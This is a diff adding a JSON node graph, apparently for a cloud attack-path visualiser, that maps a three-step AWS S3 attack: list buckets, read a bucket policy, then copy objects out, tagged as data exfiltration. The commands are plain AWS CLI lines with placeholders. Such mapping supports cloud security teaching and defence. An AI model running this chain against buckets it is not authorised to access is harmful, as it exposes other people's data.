@@ -1,0 +1,48 @@
+{
+    "title": "Exploit S3 Bucket Policy Misconfiguration to Gain Access",
+    "icon": "https://img.icons8.com/?size=100&id=106501&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List S3 Buckets",
+            "icon": "https://img.icons8.com/?size=100&id=jjoPDBNb5bi9&format=png&color=000000",
+            "details": {
+                "command": "aws s3 ls",
+                "description": "Lists all S3 buckets in the specified AWS account.",
+                "services": ["S3"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Get Bucket Policy",
+            "icon": "https://img.icons8.com/?size=100&id=bpAPjyNopdSz&format=png&color=000000",
+            "details": {
+                "command": "aws s3api get-bucket-policy --bucket <BucketName>",
+                "description": "Retrieves the policy of the specified S3 bucket.",
+                "services": ["S3"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/s3api/get-bucket-policy.html"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Exploit Bucket Policy",
+            "icon": "https://img.icons8.com/?size=100&id=QfmxGpnj0cA8&format=png&color=000000",
+            "details": {
+                "command": "aws s3 cp s3://<BucketName>/<ObjectKey> <LocalPath>",
+                "description": "Exploits a misconfigured bucket policy to access data.",
+                "services": ["S3"],
+                "attack_types": ["Privilege Escalation", "Data Exfiltration"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/s3/cp.html"
+            }
+        }
+    ]
+}
